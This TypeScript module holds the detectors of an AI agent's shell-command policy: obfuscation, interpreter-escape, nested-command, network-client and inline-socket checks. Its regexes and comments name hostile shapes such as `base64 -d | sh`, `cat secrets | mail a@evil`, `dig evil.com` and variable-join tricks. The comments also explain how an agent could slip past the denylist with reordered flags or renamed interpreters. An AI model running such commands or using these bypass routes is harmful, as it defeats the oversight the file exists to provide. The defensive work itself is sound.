// Detector functions for the shell-command policy: obfuscation, script-write,
// argv-aware interpreter escapes, network-client argv[0], and inline-network
// scans. The lexing primitives they share (tokenizer/quote/segment/basename)
// live in shell-lex.ts; the rule tables they match against live in
// shell-rules.ts; the engine that sequences them lives in shell-policy.ts.

import { isAbsolute, relative, resolve, join } from "node:path";
import { homedir } from "node:os";
import {
  INTERP_ESCAPE_BINS,
  DANGEROUS_INVOKE_BINS,
  INTERP_EVAL_FLAGS,
  RENAME_ESCAPE_EVAL_FLAGS,
} from "./shell-rules.js";
import { execBasename, resolveRealArgv0, resolveRealArgv0Index, splitShellSegments, stripQuotedSpans, tokenizeCommand } from "./shell-lex.js";
import { realpathDeep } from "./file-access.js";
import type { InlineEvalPolicy } from "./types.js";
import { DECODE_EXEC_REFUSAL, ENCODED_PAYLOAD_REFUSAL, NESTED_COMMAND_WAY_OUT } from "./shell-refusals.js";

// Re-export the lexing primitives that this module's consumers (shell-policy,
// shell-write-detector) import from here, so the split into shell-lex.ts
// changes no downstream import path.
export { splitShellSegments, stripQuotedSpans, tokenizeCommand } from "./shell-lex.js";

// Escape sequences (\xHH, \uHHHH, $'…' ANSI-C quoting) are not refused here:
// shell-policy decodes them (shell-escape-decode.ts) and judges the command
// they spell with every rule, so a hidden `rm` is refused as `rm` while a
// `sed 's/\x1b…'` that strips color codes is not refused at all.
export function detectObfuscation(command: string): string | null {
  // Decoding (base64 -d, xxd -r) and reversing (rev) are ordinary work: a JWT,
  // a hex dump, data a binary carries, a DNA reverse complement. What hides a
  // command from every rule here is handing the decoded text to a shell or
  // interpreter in the same command (`echo … | base64 -d | sh`), so that
  // pairing is what is refused. Refusing every decode cost real tasks
  // (Terminal-Bench vulnerable-secret, extract-elf, dna-assembly, 2026-10-19).
  // `od` only dumps, it never decodes, so it is not checked.
  const bins = splitShellSegments(command).map((s) => resolveRealArgv0(tokenizeCommand(s)) ?? "");
  const runs = bins.some((b) => DECODED_TEXT_RUNNERS.has(b));
  const decodes = /\bbase64\b[^|;&\n]*\s(?:-d|-D|--decode)\b/i.test(command)
    || /\bxxd\b[^|;&\n]*\s-[a-z]*r[a-z]*\b/i.test(command) || bins.includes("rev");
  if (decodes && runs) return DECODE_EXEC_REFUSAL;
  // String concatenation tricks: a='r'; b='m'; $a$b. The trick is the JOIN of
  // the pieces, so that is what is refused. Short quoted values alone are a
  // PowerShell hashtable (`@{n='Msg';e={…}}`, LogName='System'): a read-only
  // Get-WinEvent was refused as obfuscation on that shape (2026-10-19).
  if (joinsShortPieces(command)) {
    return "Blocked: suspicious variable assignment pattern (possible string concatenation obfuscation)";
  }
  // A long command is ordinary (a full python -c self-test, a JSON body); a
  // long command carrying one unbroken run of base64/hex into a shell or
  // interpreter is the payload shape. The same blob decoded into a file is data.
  if (command.length > 2000 && runs && ENCODED_BLOB.test(command)) {
    return ENCODED_PAYLOAD_REFUSAL;
  }

  return null;
}

/** Two variables assigned 1-3 letter quoted values, expanded side by side
 *  (`$a$b`, `${a}${b}`, `$a+$b`, `"$a""$b"`). */
function joinsShortPieces(command: string): boolean {
  const names = new Set([...command.matchAll(/(?:^|[\s;&|$(])([a-z_]\w*)=['"][a-z]{1,3}['"]/gi)].map((m) => m[1].toLowerCase()));
  if (names.size < 2) return false;
  const refs = [...command.matchAll(/\$\{?([a-z_]\w*)\}?/gi)];
  return refs.some((ref, i) => {
    const next = refs[i + 1];
    if (!next || !names.has(ref[1].toLowerCase()) || !names.has(next[1].toLowerCase())) return false;
    const between = command.slice(ref.index + ref[0].length, next.index);
    return /^(?:\s*\+\s*|["']{0,2})$/.test(between);
  });
}

/** Commands that would run text handed to them on stdin or as an argument. */
const DECODED_TEXT_RUNNERS: ReadonlySet<string> = new Set([
  "sh", "bash", "zsh", "dash", "ksh", "fish", "python", "perl", "ruby", "node", "php",
  "pwsh", "powershell", "eval", "source", ".", "xargs", "exec",
]);

/** An unbroken run of base64/hex characters long enough to hide a program. */
const ENCODED_BLOB = /[A-Za-z0-9+/=_-]{400,}/;

// ── Secret-placeholder injection into shell commands ──
// `{{SECRET_NAME}}` placeholders resolve ONLY in http_request (into headers,
// off-argv). The shell tool never resolves them, so `git clone
// https://{{GITHUB_SYNC_TOKEN}}@github.com` fails opaquely (literal braces
// reach git) — and resolving it here would be worse: the cleartext secret
// would land in argv (visible in any process listing) and the tool_progress
// command tails. Refuse the shape up front and redirect to the safe paths.
// Matches only the SCREAMING_SNAKE form real secret names use, so Go/Docker
// `{{.Field}}` (leading dot) and Jinja `{{ VAR }}` (spaces) don't trip it.
export function detectSecretPlaceholder(command: string): string | null {
  const m = command.match(/\{\{([A-Z][A-Z0-9_]*)\}\}/);
  if (!m) return null;
  return `Blocked: {{${m[1]}}} secret placeholders are not resolved in shell commands (that would leak the secret into argv / process listings). For a CLI or a background process, pass it as an environment variable instead, with the secret_env argument: secret_env: { "ENV_VAR": "${m[1]}" } and reference $ENV_VAR (the value never enters the command text or your context). For an API, use http_request with {{SECRET_NAME}} in a header. For git over HTTPS the token is supplied via the credential helper, never the URL.`;
}

// Hard-block heredoc + inline-script writes targeting the repo. Workers were
// using `cat <<EOF > foo` and `python -c "open(...).write(...)"` to "edit"
// files; bash exits 0 even when the script silently no-ops, so the worker
// reported success after writing nothing. Force them to use write/edit tools
// (which return verifiable confirmations).
export function detectScriptWrite(command: string): string | null {
  // 1. Heredoc redirected to a file: `<<EOF >`, `<<-EOF >>`, `<<'EOF' > path`, etc.
  if (/<<-?\s*['"]?\w+['"]?[\s\S]*?>{1,2}\s*\S/.test(command)) {
    return "Use the write/edit tools instead — bash exit 0 ≠ work done.";
  }
  // 2. python/node/perl/ruby -c "..." that calls open()/write_text/writeFile/etc.
  //    We only flag when both an inline-script flag AND a write call appear.
  const hasInlineScript = /\b(python[23]?|node|perl|ruby)\b\s+-[ce]\s/i.test(command);
  if (hasInlineScript) {
    const writeCallPatterns = [
      /\bopen\s*\([^)]*,\s*['"][wax]b?\+?/i,              // open(path, 'w'/'a'/'x' or 'wb'/'ab'/'w+') - mode must be 2nd positional arg
      /\.write_text\s*\(/i,                              // pathlib write_text
      /\.write_bytes\s*\(/i,                             // pathlib write_bytes
      /\bwriteFileSync\s*\(/i,                           // node fs.writeFileSync
      /\bfs\.writeFile\s*\(/i,                           // node fs.writeFile
      /\bappendFileSync\s*\(/i,                          // node fs.appendFileSync
      /\bPath\s*\([^)]*\)\.write/i,                      // pathlib Path(p).write_*
      /\bshutil\.(copy|move)/i,                          // python shutil mutating
    ];
    if (writeCallPatterns.some(p => p.test(command))) {
      return "Use the write/edit tools instead — bash exit 0 ≠ work done.";
    }
  }
  // 3. sed -i / awk inplace editing files in-place
  if (/\bsed\s+(-[a-zA-Z]*i[a-zA-Z]*|-(-in-place))\b/i.test(command)) {
    return "Use the edit tool (one file) or bulk_replace (same replacement across many files) instead — bash exit 0 ≠ work done. This gate applies in every file-access mode and location; the target path is not the issue.";
  }
  if (/\bawk\b[^|]*\binplace\b/i.test(command)) {
    return "Use the edit tool (one file) or bulk_replace (same replacement across many files) instead — bash exit 0 ≠ work done. This gate applies in every file-access mode and location; the target path is not the issue.";
  }
  // 4. Plain redirect of `echo`/`printf` to a writable file path is allowed
  //    (small one-liners don't trip the silent-noop bug). Heredocs are the
  //    real problem because they swallow newlines + multi-line content.
  return null;
}

// ── C3-13: argv-aware interpreter-escape detection ──
// The bare-form denylist (`\bperl\s+-e\b`, …) only catches the flag IMMEDIATELY
// after the binary, so `perl -w -e`, `perl -Mstrict -e`, `ruby -rsocket -e`,
// `ruby -w -e` slip through. Tokenize each pipe segment; if argv[0]'s basename
// is an inline-eval interpreter and ANY later token is an eval/require flag —
// `-e`/`-E`/`-r`, or a clustered short-flag containing e/E/r (e.g. `-we`,
// `-rsocket`) — block it, regardless of intervening flags.
export function detectInterpreterEscape(command: string): string | null {
  for (const segment of command.split("|")) {
    const tokens = tokenizeCommand(segment);
    if (tokens.length === 0) continue;
    const bin = execBasename(tokens[0]);
    if (!INTERP_ESCAPE_BINS.has(bin)) continue;
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--") break; // end-of-flags; remaining tokens are operands
      if (!t.startsWith("-") || t.startsWith("--")) continue; // operand or long-flag
      // Short-flag (cluster). Flag chars come before any glued value: in
      // `-rsocket` the flag is `r`, "socket" is its argument. The eval/require
      // flags are the LEADING cluster chars up to the first that takes a value.
      // Simplest sound rule: if any of e/E/r appears in the short-flag token's
      // letters, treat it as an inline-eval/require escape.
      const flagBody = t.slice(1);
      if (/[eEr]/.test(flagBody)) {
        return `Blocked: ${bin} inline-eval/require flag (interpreter escape).`;
      }
    }
  }
  return null;
}

// ── Nested-command execution constructs (mode-INDEPENDENT, POSIX) ──
// These run a COMMAND nested inside another position: command substitution
// $(...), backticks `...`, subshell ( ... ), brace-group { ...; }, funsub
// ${ ...; }, and process substitution <(...) / >(...). The always-on argv[0]
// scans (the network-client rule / detectDangerousInvokeBin) inspect only the
// resolved argv[0] of each separator-split segment and CANNOT see a binary
// invoked INSIDE such a construct (`echo $(dig evil.com)`, `(dig evil.com)`),
// while the argv[0]-only bins (dig/host/nslookup/xh/http/httpie/mail/ping/
// traceroute/getent) have no raw-string BLOCKED_COMMANDS backstop the way
// curl/wget/nc do. Where the structural rules stand down (a kernel cage, a
// disposable sandbox), shell-policy takes each construct apart instead
// (shell-nested-commands.ts) and judges its body as a command of its own, so
// by the time this runs there none are left. On an unconfined host they stay
// refused here: a substituted argument can name a path the file-access checks
// never see, and there no cage holds what the checks miss.
//
// CRITICAL lexical rule: `$((` is ARITHMETIC and `${NAME}` is PARAMETER
// expansion — both ALLOWED; only `$(` (not `$((`) and `${` + space/`|` (funsub,
// not a parameter name) are command execution. Backtick/`$(`/`${` are matched
// on the RAW command because bash expands them inside DOUBLE quotes too
// (`echo "$(dig x)"` still runs dig); a single-quoted occurrence is a rare,
// harmless FP. Subshell/brace/procsub are NOT special inside quotes, so they're
// detected at a command POSITION via the quote-aware segment split (a literal
// `(` in `echo "(hi)"`, or brace-EXPANSION `cp a.{js,ts}` with no leading
// space, is not misread as a group).
export function detectNestedCommandExecution(command: string): string | null {
  if (/`/.test(command)) {
    return `Blocked: backtick command substitution runs a nested command whose argv the network/denylist scan can't see. Use $(( )) for arithmetic. ${NESTED_COMMAND_WAY_OUT}`;
  }
  // $( command-sub, but NOT $(( arithmetic (negative lookahead on the 2nd paren).
  if (/\$\((?!\()/.test(command)) {
    return `Blocked: $(...) command substitution runs a nested command whose argv the network/denylist scan can't see. Arithmetic $(( )) and parameter \${...} expansion are allowed. ${NESTED_COMMAND_WAY_OUT}`;
  }
  // bash 5.3 function/value substitution: `${ cmd; }` / `${| cmd; }` RUN a
  // command; `${` + whitespace/`|` distinguishes funsub from a `${NAME}` param.
  if (/\$\{[\s|]/.test(command)) {
    return `Blocked: \${ ...; } function substitution runs a nested command whose argv the network/denylist scan can't see. Use \${NAME} parameter expansion. ${NESTED_COMMAND_WAY_OUT}`;
  }
  // Process substitution <(...) / >(...) — quote-stripped so a literal `>(`
  // inside quotes isn't misread (the operator is not quote-expandable).
  if (/[<>]\(/.test(stripQuotedSpans(command))) {
    return `Blocked: process substitution <(...) / >(...) runs a nested command whose argv the network/denylist scan can't inspect. ${NESTED_COMMAND_WAY_OUT}`;
  }
  // Subshell ( ... ) and brace-group { ...; } at a command position. `((` at a
  // segment start is an arithmetic command (no nested command) and is allowed.
  for (const segment of splitShellSegments(command)) {
    const t = segment.trim();
    if (t.startsWith("(") && !t.startsWith("((")) {
      return `Blocked: a ( subshell ) runs its contents as a nested command the network/denylist scan can't inspect. Run the command without the subshell. ${NESTED_COMMAND_WAY_OUT}`;
    }
    if (/^\{\s/.test(t)) {
      return `Blocked: a { brace group; } runs its contents as a nested command the network/denylist scan can't inspect. Run the command without the group. ${NESTED_COMMAND_WAY_OUT}`;
    }
  }
  return null;
}

// ── argv[0] dangerous-command basenames ──
// Block these binaries when they are the INVOKED command (argv[0]) of any pipe
// segment, never as a substring — so a dangerous binary NAME appearing as an
// argument (`grep host`, `… | grep open`, `echo "ping it"`) is ALLOWED, while
// invoking it (`host evil`, `mount /dev/x /mnt`, `cat secrets | mail a@evil`) is
// blocked. This replaces the old `\bhost\s`/`\bopen\s`/… BLOCKED_COMMANDS
// substrings that false-positived on benign arguments. Same resolveRealArgv0
// approach as the network-client rule — and the same splitShellSegments
// segmentation: this scan stays on in every sandbox mode, so it must see every
// command position (`true; dig evil.com`, `cd x && host evil.com`, `then dig`,
// `env host`), not just pipe segments and not just tokens[0].
export function detectDangerousInvokeBin(command: string): string | null {
  for (const segment of splitShellSegments(command)) {
    const tokens = tokenizeCommand(segment);
    const at = resolveRealArgv0Index(tokens);
    const bin = at === null ? null : execBasename(tokens[at]);
    if (bin === "mount" && (mountOnlyLists(tokens.slice(at! + 1)) || mountsImageReadOnly(tokens.slice(at! + 1)))) continue;
    if (bin === "umount" && unmountsWorkingMount(tokens.slice(at! + 1))) continue;
    if (bin && DANGEROUS_INVOKE_BINS.has(bin)) {
      return `Blocked: '${bin}' is a restricted network/system command. (If you only named it as an argument, rephrase — the block is on INVOKING it, not mentioning it.)`;
    }
  }
  return null;
}

/**
 * `mount` with nothing to attach only prints the mount table, as readable as
 * `df` or `lsblk`, which are allowed (Terminal-Bench 2.0 password-recovery,
 * 2026-10-23, began with `mount | grep`). It attaches a filesystem only when
 * given a device or target, `-a` (everything in fstab), or a remount option, so
 * the listing forms are the bare command, `-l`, and a `-t` type filter; any
 * other word keeps the refusal.
 */
function mountOnlyLists(args: string[]): boolean {
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === "-l") continue;
    if (a === "-t" || a === "--types") { if (++i >= args.length) return false; continue; }
    if (/^-t[\w,]+$/.test(a) || /^--types=[\w,]+$/.test(a)) continue;
    return false;
  }
  return true;
}

// Filesystems an image file holds. A network type (nfs, cifs, sshfs, …) reaches
// off the box, so it is not among them.
const IMAGE_FS_TYPES = new Set(["auto", "iso9660", "udf", "ext2", "ext3", "ext4", "vfat", "msdos", "exfat", "ntfs", "ntfs3", "squashfs", "erofs", "xfs", "btrfs"]);
// The options a read-only loop mount may carry besides `ro` and `loop`.
const IMAGE_MOUNT_OPTIONS = /^(?:ro|loop|noexec|nosuid|nodev|noatime|offset=\d+|sizelimit=\d+)$/;
// A device, a kernel tree, a network share (`host:/x`, `//server/share`) or a
// Windows device path is not an image file.
const NOT_AN_IMAGE = /^(?:(?:\/|(?:\.\.?\/)+)+(?:dev|proc|sys)(?:\/|$)|\/\/|\\)|:/i;

/** Where an image may be mounted: a folder below /mnt, /media or /tmp. Never
 *  over a system folder, which a mount would hide (`/etc`, `/usr/bin`), never
 *  the shared roots themselves, and never a relative path, which from `/` is
 *  `etc`. */
function isWorkingMountPoint(target: string): boolean {
  const t = target.replace(/\/+$/, "");
  if (/(?:^|\/)\.\.?(?:\/|$)/.test(t) || /[$`~*?]/.test(t)) return false;
  return /^\/(?:mnt|media|tmp)\/[^/]/.test(t);
}

/**
 * `mount -o loop,ro disk.img /mnt/img`: an image file attached read-only so its
 * files can be read, the first move on a disk-image or ISO task (TB2
 * qemu-startup and qemu-alpine-ssh, 2026-10-27, both opened with it; refused,
 * the model spent its time parsing ISO9660 in Python). Read-only and backed by
 * a file, it changes nothing on any disk. Allowed only in exactly that shape:
 * `ro` (or `-r`) and `loop` both given, an image filesystem type if any, one
 * file source and a mount point below /mnt, /media or /tmp. Every other flag
 * (`--bind`, `--move`, `-a`, remount, rw) keeps the refusal.
 */
function mountsImageReadOnly(args: string[]): boolean {
  const options: string[] = [];
  const operands: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === "-r" || a === "--read-only") { options.push("ro"); continue; }
    const opt = a === "-o" || a === "--options" ? args[++i] : /^-o(.+)$/.exec(a)?.[1] ?? /^--options=(.+)$/.exec(a)?.[1];
    if (opt !== undefined) { options.push(...opt.split(",")); continue; }
    const type = a === "-t" || a === "--types" ? args[++i] : /^-t(.+)$/.exec(a)?.[1] ?? /^--types=(.+)$/.exec(a)?.[1];
    if (type !== undefined) { if (!type.split(",").every((t) => IMAGE_FS_TYPES.has(t.toLowerCase()))) return false; continue; }
    if (a.startsWith("-")) return false;
    operands.push(a);
  }
  if (!options.includes("ro") || !options.includes("loop") || !options.every((o) => IMAGE_MOUNT_OPTIONS.test(o))) return false;
  return operands.length === 2 && !NOT_AN_IMAGE.test(operands[0]) && isWorkingMountPoint(operands[1]);
}

/** `umount /mnt/img`: detaching what mountsImageReadOnly may attach, and only
 *  that — a working mount point, no flags (`-a` and `-l` reach further). */
function unmountsWorkingMount(args: string[]): boolean {
  return args.length > 0 && args.every((a) => !a.startsWith("-") && isWorkingMountPoint(a));
}

// ── C3-17: raw-socket / network module use in node -e / python -c bodies ──
// The denylist above flags some HTTP *libraries* (requests/urllib/httpx) but
// misses RAW SOCKETS and the low-level node/python network modules, which give
// the same arbitrary-egress capability inside an inline script body. Broaden
// the inline-interpreter scan to also flag net/socket/https/http(module)/dgram/
// fetch/tls/connect. Only fires when an inline-script flag (node -e / python -c
// / perl -e / ruby -e) AND a network-module reference both appear, matching the
// existing detectScriptWrite style.
export function detectInlineNetwork(command: string): string | null {
  const hasInlineScript =
    /\b(python[23]?|node|perl|ruby)\b\s+-[a-zA-Z]*[ce]\b/i.test(command);
  if (!hasInlineScript) return null;
  const networkPatterns = [
    /\bimport\s+socket\b/i,                 // python: import socket
    /\bsocket\.socket\s*\(/i,               // python: socket.socket(...)
    /\brequire\s*\(\s*['"](net|https?|dgram|tls)['"]\s*\)/i, // node: require("net"/"http"/"https"/"dgram"/"tls")
    /\bimport\s+.*\bfrom\s+['"](net|https?|dgram|tls)['"]/i, // node ESM: import x from "net"
    /\bIO::Socket\b/i,                      // perl: IO::Socket
    /\buse\s+Socket\b/i,                    // perl: use Socket
    /\bTCPSocket\b/i,                       // ruby: TCPSocket
    /\bfetch\s*\(/i,                        // node 18+/deno global fetch()
    /\.connect\s*\(/i,                      // socket/Socket .connect(...)
  ];
  if (networkPatterns.some((p) => p.test(command))) {
    return "Blocked: raw socket / network module in inline script — use http_request (SSRF-checked) instead.";
  }
  return null;
}

// Is this argv[0] token written as a PATH (vs. a bare command name resolved via
// $PATH)? `./myperl`, `../bin/x`, `/tmp/py`, `~/py`, `build/app` all are; a bare
// `node` / `perl` is not. Mirrors the path-shape intent of shell-path-guard's
// looksLikePath but for argv[0] (which that guard deliberately skips).
function isPathForm(token: string): boolean {
  return (
    token.startsWith("./") ||
    token.startsWith("../") ||
    token.startsWith("/") ||
    token.startsWith("~") ||
    token.includes("/") ||
    token.includes("\\")
  );
}

// Does a path-form argv[0] resolve into the tree the model writes? A renamed
// interpreter the model dropped to escape the basename denylist lives in the
// workspace or the surrounding project root (a relocated workspace bridges
// back there and the checkout-relative tools write it too). The user's home is
// NOT that tree: on Windows every installed tool lives under it (AppData), and
// counting it made `…/Android/Sdk/platform-tools/adb.exe … -p <package>` a
// "renamed interpreter". A relative `./myperl` is anchored at the WORKSPACE
// (the agent's effective cwd when it runs a shell command), `~` expands to
// home, and both the target and the roots are realpath'd so a symlinked
// workspace still compares. Best-effort: on a resolution failure, fall back to
// the lexical path.
function resolvesIntoWritableTree(token: string, workspace: string): boolean {
  let raw = token;
  if (raw === "~") raw = homedir();
  else if (raw.startsWith("~/") || raw.startsWith("~\\")) raw = join(homedir(), raw.slice(2));

  const rawWorkspace = resolve(workspace);
  const resolved = isAbsolute(raw) ? resolve(raw) : resolve(rawWorkspace, raw);

  let realWorkspace: string;
  let realProjectRoot: string;
  let realTarget: string;
  try {
    realWorkspace = realpathDeep(rawWorkspace);
    realProjectRoot = realpathDeep(resolve(rawWorkspace, ".."));
    realTarget = realpathDeep(resolved);
  } catch {
    realWorkspace = rawWorkspace;
    realProjectRoot = resolve(rawWorkspace, "..");
    realTarget = resolved;
  }
  const inWorkspace = !relative(realWorkspace, realTarget).startsWith("..");
  const inProjectRoot = !relative(realProjectRoot, realTarget).startsWith("..");
  return inWorkspace || inProjectRoot;
}

// Leading `NAME=value` words are the command's environment, not the command:
// `ADB="/c/…/adb.exe"; "$ADB" -s …` starts with an assignment whose VALUE is
// a path, and reading it as argv[0] made the assignment a "workspace
// executable" (a relative resolve of `ADB=/c/…` lands inside the workspace).
function skipLeadingAssignments(tokens: string[]): string[] {
  let i = 0;
  while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) i++;
  return tokens.slice(i);
}

// ── R4-11/R4-13: refuse the inline-eval interpreter FORM (non-unrestricted) ──
// A regex over a Turing-complete `node -e`/`python -c` body cannot soundly say
// whether it touches the network (R4-11), and keying the escape detectors on a
// basename SPELLING set lets a renamed interpreter bypass them (R4-13). The
// sound fix is to refuse the FORM in common/workspace modes (unrestricted stays
// permissive) — the agent writes a path-guard-visible script file instead.
//   (a) a known interpreter basename invoked with its eval flag, OR
//   (b) the rename-escape: a model-writable-path argv[0] invoked with an
//       eval-style flag (legit workspace executables aren't run with `-e`).
// This complements (does not replace) detectInterpreterEscape/detectInlineNetwork,
// which stay as defense-in-depth. It does NOT blanket-deny workspace execution —
// only the eval-flag interpreter-escape shape. `sh -c`/`bash -c` are ALLOWED
// because no shell basename carries an eval-flag table (and `-c` is not a
// rename-escape flag for them: a bare `sh`/`bash` argv[0] is not a path form,
// and a path-form `./myshell -c` IS the rename-escape this targets).
export function detectInlineInterpreterEval(
  words: string[],
  policy: InlineEvalPolicy,
  workspace: string,
): string | null {
  if (policy === "allow") return null; // inline-eval permitted by policy
  const tokens = skipLeadingAssignments(words);
  if (tokens.length === 0) return null;
  const argv0 = tokens[0];
  const bin = execBasename(argv0);

  // (a) Known interpreter basename + its eval flag anywhere in the argv.
  const evalFlags = INTERP_EVAL_FLAGS[bin];
  if (evalFlags) {
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--") break; // end-of-flags; the rest are operands
      if (evalFlags.has(t)) {
        return `Blocked: ${bin} inline-eval flag (${t}) — write a script file (write/edit) and run that instead. A regex can't soundly vet an inline interpreter body, so this form is refused unless inline-eval is explicitly allowed.`;
      }
    }
    return null;
  }

  // (b) Rename-escape: a model-writable-path argv[0] (the model could drop a
  // renamed interpreter there) invoked with an eval-style flag. A real dev
  // executable (`./node_modules/.bin/tsc`, `./build/app`) is never run with
  // `-e '<code>'`, so this targets the rename-escape without breaking workflows.
  if (isPathForm(argv0) && resolvesIntoWritableTree(argv0, workspace)) {
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--") break;
      if (RENAME_ESCAPE_EVAL_FLAGS.has(t)) {
        return `Blocked: workspace executable invoked with an inline-eval flag (${t}) — looks like a renamed interpreter escaping the interpreter denylist. Write a script file and run that instead.`;
      }
    }
  }
  return null;
}
